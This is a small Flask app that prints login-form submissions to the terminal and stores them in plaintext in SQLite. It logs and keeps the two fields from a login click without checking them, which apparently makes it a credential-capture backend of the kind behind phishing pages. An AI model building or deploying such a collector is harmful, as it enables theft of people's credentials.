from flask import Flask, request, jsonify, render_template
import sqlite3

app = Flask(__name__)

DB_NAME = "data.db"

# Create table if not exists
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS entries (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            field1 TEXT,
            field2 TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/send", methods=["POST"])
def receive():
    data = request.get_json()
    field1 = data.get("field1")
    field2 = data.get("field2")

    # Print to terminal
    print("=== USER CLICKED LOGIN ===")
    print("Field 1:", field1)
    print("Field 2:", field2)
    print("==========================")

    # Save to SQLite
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO entries (field1, field2) VALUES (?, ?)",
        (field1, field2)
    )
    conn.commit()
    conn.close()

    return jsonify({"status": "saved"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)